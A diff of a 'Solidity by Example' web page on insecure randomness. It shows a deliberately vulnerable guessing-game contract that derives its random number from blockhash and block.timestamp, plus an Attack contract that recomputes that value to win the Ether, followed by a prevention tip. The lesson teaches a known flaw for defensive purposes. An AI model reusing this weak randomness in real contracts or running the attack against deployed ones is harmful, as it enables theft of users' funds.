@@ -1,1 +1,58 @@
-<!DOCTYPE html><html class="fa-events-icons-ready" lang="en"><head><meta charset="utf-8"><link href="/solidity-example/favicon.ico" rel="shortcut icon"><meta content="width=device-width,initial-scale=1,shrink-to-fit=yes" name="viewport"><meta content="#000000" name="theme-color"><script src="https://www.google-analytics.com/analytics.js" async type="text/javascript"></script><script src="https://use.fontawesome.com/ba3dde78ee.js"></script><link href="https://www.googletagmanager.com" rel="preconnect"><link href="https://use.fontawesome.com/ba3dde78ee.css" rel="stylesheet" media="all"><link href="/solidity-example/manifest.json" rel="manifest"><title>Solidity by Example</title><script src="https://www.googletagmanager.com/gtag/js?id=UA-133759045-1" async></script><script>function gtag(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],gtag("js",new Date),gtag("config","UA-133759045-1")</script><script src="/solidity-example/static/js/main.c873b319.js" defer></script><link href="/solidity-example/static/css/main.2a12f570.css" rel="stylesheet"><link href="https://use.fontawesome.com" rel="preconnect"><link href="https://www.google-analytics.com" rel="preconnect"></head><body class="light"><noscript>You need to enable JavaScript to run this app.</noscript><script>const theme=localStorage.getItem("theme")||"light";document.body.classList.add(theme)</script><div id="root"></div></body></html>
+<!DOCTYPE html><html class="fa-events-icons-ready" lang="en"><head><meta charset="utf-8"><link href="/solidity-example/favicon.ico" rel="shortcut icon"><meta content="width=device-width,initial-scale=1,shrink-to-fit=yes" name="viewport"><meta content="#000000" name="theme-color"><script src="https://www.google-analytics.com/analytics.js" async type="text/javascript"></script><script src="https://use.fontawesome.com/ba3dde78ee.js"></script><link href="https://www.googletagmanager.com" rel="preconnect"><link href="https://use.fontawesome.com/ba3dde78ee.css" rel="stylesheet" media="all"><link href="/solidity-example/manifest.json" rel="manifest"><title>Source of Randomness | Solidity by Example | 0.8.10</title><script src="https://www.googletagmanager.com/gtag/js?id=UA-133759045-1" async></script><script>function gtag(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],gtag("js",new Date),gtag("config","UA-133759045-1")</script><script src="/solidity-example/static/js/main.dc5280b7.js" defer></script><link href="/solidity-example/static/css/main.2a12f570.css" rel="stylesheet"><link href="https://use.fontawesome.com" rel="preconnect"><meta content="Blockchain is not a reliable source of randomness in Solidity" name="Description" data-react-helmet="true"><link href="https://www.google-analytics.com" rel="preconnect"></head><body class="light"><noscript>You need to enable JavaScript to run this app.</noscript><script>const theme=localStorage.getItem("theme")||"light";document.body.classList.add(theme)</script><div id="root"><div class="App_component__uBhCy"><div class="Header_component__dJEiY"><a href="/"><img alt="logo" class="Header_logo__nZ7K6" src="/solidity-example/static/media/logo.ed2942c41ca20fd4f70a.png"></a><h3 class="Header_header__Lhnr8"><a href="/">Solidity by Example</a><div class="Header_versions__j+f36"><div class="Header_version__4Ju4J">version 0.8.10</div></div></h3><img alt="dark mode" class="Header_dark__TFGN2" src="/solidity-example/static/media/mode-dark.5726a29b11b0940df6a4.png"></div><div class="App_main__nhgh3"><div class="Example_component__4Fiv8"><div class="Example_content__6NsNh"><h2>Source of Randomness</h2><div><h3 id="vulnerability">Vulnerability</h3><p><code>blockhash</code> and <code>block.timestamp</code> are not reliable sources for randomness.</p><pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
+<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.8.10;</span>
+
+<span class="hljs-comment">/*
+<span class="hljs-doctag">NOTE:</span> cannot use blockhash in Remix so use ganache-cli
+
+npm i -g ganache-cli
+ganache-cli
+In remix switch environment to Web3 provider
+*/</span>
+
+<span class="hljs-comment">/*
+GuessTheRandomNumber is a game where you win 1 Ether if you can guess the
+pseudo random number generated from block hash and timestamp.
+
+At first glance, it seems impossible to guess the correct number.
+But let's see how easy it is win.
+
+1. Alice deploys GuessTheRandomNumber with 1 Ether
+2. Eve deploys Attack
+3. Eve calls Attack.attack() and wins 1 Ether
+
+What happened?
+Attack computed the correct answer by simply copying the code that computes the random number.
+*/</span>
+
+<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">GuessTheRandomNumber</span> </span>{
+    <span class="hljs-function"><span class="hljs-keyword">constructor</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">payable</span></span> </span>{}
+
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">guess</span>(<span class="hljs-params"><span class="hljs-keyword">uint</span> _guess</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{
+        <span class="hljs-keyword">uint</span> answer <span class="hljs-operator">=</span> <span class="hljs-keyword">uint</span>(
+            <span class="hljs-built_in">keccak256</span>(<span class="hljs-built_in">abi</span>.<span class="hljs-built_in">encodePacked</span>(<span class="hljs-built_in">blockhash</span>(<span class="hljs-built_in">block</span>.<span class="hljs-built_in">number</span> <span class="hljs-operator">-</span> <span class="hljs-number">1</span>), <span class="hljs-built_in">block</span>.<span class="hljs-built_in">timestamp</span>))
+        );
+
+        <span class="hljs-keyword">if</span> (_guess <span class="hljs-operator">=</span><span class="hljs-operator">=</span> answer) {
+            (<span class="hljs-keyword">bool</span> sent, ) <span class="hljs-operator">=</span> <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>.<span class="hljs-built_in">call</span>{<span class="hljs-built_in">value</span>: <span class="hljs-number">1</span> <span class="hljs-literal">ether</span>}(<span class="hljs-string">""</span>);
+            <span class="hljs-built_in">require</span>(sent, <span class="hljs-string">"Failed to send Ether"</span>);
+        }
+    }
+}
+
+<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">Attack</span> </span>{
+    <span class="hljs-function"><span class="hljs-keyword">receive</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">external</span></span> <span class="hljs-title"><span class="hljs-keyword">payable</span></span> </span>{}
+
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">attack</span>(<span class="hljs-params">GuessTheRandomNumber guessTheRandomNumber</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{
+        <span class="hljs-keyword">uint</span> answer <span class="hljs-operator">=</span> <span class="hljs-keyword">uint</span>(
+            <span class="hljs-built_in">keccak256</span>(<span class="hljs-built_in">abi</span>.<span class="hljs-built_in">encodePacked</span>(<span class="hljs-built_in">blockhash</span>(<span class="hljs-built_in">block</span>.<span class="hljs-built_in">number</span> <span class="hljs-operator">-</span> <span class="hljs-number">1</span>), <span class="hljs-built_in">block</span>.<span class="hljs-built_in">timestamp</span>))
+        );
+
+        guessTheRandomNumber.guess(answer);
+    }
+
+    <span class="hljs-comment">// Helper function to check balance</span>
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getBalance</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">view</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">uint</span></span>) </span>{
+        <span class="hljs-keyword">return</span> <span class="hljs-keyword">address</span>(<span class="hljs-built_in">this</span>).<span class="hljs-built_in">balance</span>;
+    }
+}
+</code></pre><h3 id="preventative-techniques">Preventative Techniques</h3><ul><li>Don't use <code>blockhash</code> and <code>block.timestamp</code> as source of randomness</li></ul></div><div class="Example_prevNext__kHIFg"></div><p>Try on <a href="https://remix.ethereum.org" target="__blank">Remix</a></p></div></div></div></div></div></body></html>
